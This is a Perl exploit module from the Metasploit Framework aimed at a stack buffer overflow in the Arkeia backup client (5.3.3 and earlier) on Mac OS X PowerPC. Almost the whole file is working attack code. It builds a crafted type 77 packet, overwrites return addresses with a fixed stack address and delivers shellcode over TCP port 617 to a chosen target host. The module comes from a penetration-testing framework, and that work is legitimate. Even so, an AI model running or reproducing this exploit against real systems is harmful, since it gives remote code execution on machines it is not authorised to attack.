##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::arkeia_type77_macos;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
{
'Name' => 'Arkeia Backup Client Type 77 Overflow (Mac OS X)',
'Version' => '$Revision: 1.1 $',
'Authors' => [ 'H D Moore <hdm [at] metasploit.com>' ],
'Arch' => [ 'ppc' ],
'OS' => [ 'osx'],
'Priv' => 1,

'UserOpts' => 
{
'RHOST' => [1, 'ADDR', 'The target address'],
'RPORT' => [1, 'PORT', 'The target port', 617],
},

'Payload' => 
{
'Space' => 1000,
'BadChars' => "\x00",
'MinNops' => 700,
},

'Description' => Pex::Text::Freeform(qq{
This module exploits a stack overflow in the Arkeia backup
client for the Mac OS X platform. This vulnerability affects
all versions up to and including 5.3.3 and has been tested 
with Arkeia 5.3.1 on Mac OS X 10.3.5. 
}),

'Refs' => 
[
['URL', 'http://lists.netsys.com/pipermail/full-disclosure/2005-February/031831.html'],
],

'Targets' => 
[
['Arkeia 5.3.1 Stack Return (boot)', 0xbffff910 ],
],

'Keys' => ['arkeia'],
};

sub new {
my $class = shift;
my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
return($self);
}

sub Exploit {
my $self = shift;
my $target_host = $self->GetVar('RHOST');
my $target_port = $self->GetVar('RPORT');
my $target_idx = $self->GetVar('TARGET');
my $shellcode = $self->GetVar('EncodedPayload')->Payload;
my $target = $self->Targets->[$target_idx];

$self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

my $s = Msf::Socket::Tcp->new
(
'PeerAddr' => $target_host,
'PeerPort' => $target_port,
);

if ($s->IsError) {
$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
return;
}

my $head = "\x00\x4d\x00\x03\x00\x01\xff\xff";

# Request has to be big enough to find and small enough
# not to write off the end of the stack. If we write too
# far down, we also smash env[], which causes a crash in
# getenv() before our function returns.

my $poof = Pex::Text::EnglishText(1200);

# Configure the length value of the data in the packet header
substr($head, 6, 2, pack('n', length($poof)));

# Return back to the stack either directly or via system lib
substr($poof, 0, 112, pack('N', $target->[1]) x (112 / 4));

# Huge nop slep followed by the payload
substr($poof, 112, length($shellcode), $shellcode);


$self->PrintLine("[*] Sending " .length($poof) . " bytes to remote host.");
$s->Send($head);
$s->Send($poof);

# Wait a few seconds for the payload to pop...
$s->Recv(-1, 10);

return;
}

1;
